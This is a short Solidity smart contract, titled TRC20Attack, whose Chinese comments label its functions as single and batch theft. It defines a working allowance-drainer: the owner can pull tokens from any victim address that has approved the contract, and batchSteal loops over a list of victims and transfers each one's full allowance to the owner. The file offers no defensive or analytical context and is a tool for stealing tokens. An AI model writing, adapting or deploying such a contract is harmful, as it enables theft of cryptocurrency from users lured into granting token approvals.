// TRC20Attack.sol
pragma solidity ^0.8.0;

interface ITRC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract TRC20Attack {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    
    // 单次盗取
    function steal(address token, address victim, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        ITRC20(token).transferFrom(victim, owner, amount);
    }
    
    // 批量盗取（核心）
    function batchSteal(address token, address[] calldata victims) external {
        require(msg.sender == owner, "not owner");
        for (uint i = 0; i < victims.length; i++) {
            uint256 allowance = ITRC20(token).allowance(victims[i], address(this));
            if (allowance > 0) {
                ITRC20(token).transferFrom(victims[i], owner, allowance);
            }
        }
    }
}
